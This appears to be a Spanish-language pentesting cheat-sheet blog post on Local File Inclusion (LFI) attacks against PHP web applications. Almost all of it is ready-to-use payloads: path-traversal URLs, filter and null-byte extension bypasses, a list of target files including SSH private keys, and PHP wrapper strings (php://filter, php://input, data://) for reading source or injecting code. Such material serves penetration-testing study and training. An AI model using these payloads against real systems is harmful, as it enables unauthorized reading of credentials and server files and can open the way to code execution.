---
title: "LFI (Local File Inclusion)"
author: Tuch0
date: 2023-09-17
categories: [Vectores-de-Ataque]
tags: [CACFD9A6]
image:
    path: ../../assets/Miniaturas/VectoresDeAtaque/lfi.jpg
    width: 800
    height: 500
---

#### Recursos
- https://github.com/synacktiv/php_filter_chain_generator


## Ejemplos

```bash
# Básico
http://<web>/<file>.php?file=../../../../../../../../../<file>

# Bypass Traversal
http://<web>/<file>.php?file=..../..../..../..../..../..../..../<file>

# Cargas Útiles
http://<web>/<file>.php?file=/<folder>//<file>

# ByPass Extension (Null Byte)
http://<web>/<file>.php?<file>=<filename>%00.php

# ByPass Detected Especific Word
http://<web>/<file>.php?<file>=<filename>/.
```

## Archivos interesantes

```js
/etc/hosts
/home/<user>/.ssh/id_rsa
/home/<user>/.ssh/id_rsa.pub
/var/www/html/
/proc/net/tcp
```

### Wrappers
```bash
php://filter/convert.base64-encode/resource=<filename>.php
php://filter/read=string.rot13/resource=<filename>.php
php://filter/convert.iconv.utf-8.utf-16/resource=<filename>.php
php://input (method: POST)
data://text/plain;base64,<base64-code>
```

